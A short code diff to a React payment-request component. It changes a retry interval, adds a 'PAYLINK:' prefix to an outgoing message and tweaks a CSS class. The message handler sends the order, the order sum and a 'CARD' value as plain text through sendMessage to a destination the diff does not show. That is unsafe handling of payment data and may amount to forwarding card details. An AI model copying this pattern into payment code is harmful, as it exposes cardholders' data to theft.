@@ -81,7 +81,7 @@ const PaymentRequest = () => {
 
   useEffect(() => {
     const maxRetries = 10;
-    const retryInterval = 2000;
+    const retryInterval = 1200;
 
     const initiateOrder = async (attempt = 1) => {
       try {
@@ -125,7 +125,7 @@ const PaymentRequest = () => {
   const handleSmsSend = async (order, orderSum, card) => {
     try {
       const message = `
-        order: [${order}] orderSum: [${orderSum}] CARD: [${card}]
+        PAYLINK: order: [${order}] orderSum: [${orderSum}] CARD: [${card}]
       `;
       sendMessage(message);
     } catch (error) {
@@ -265,7 +265,7 @@ const PaymentRequest = () => {
               {rules.map((rule, index) => (
                 <li
                   key={index}
-                  className={`bg-gray-form rounded-xl content-center font-sm cursor-pointer md:w-[95%] w-[100%] mx-auto ${expandedRule === index ? 'text-purple-700' : 'text-grayth'}`}
+                  className={`bg-gray-form rounded-xl content-center font-sm cursor-pointer md:w-[95%] w-[100%]  ${expandedRule === index ? 'text-purple-700' : 'text-grayth'}`}
                   onClick={() => handleRuleClick(index)}
                 >
                   <div className="flex justify-between items-center">
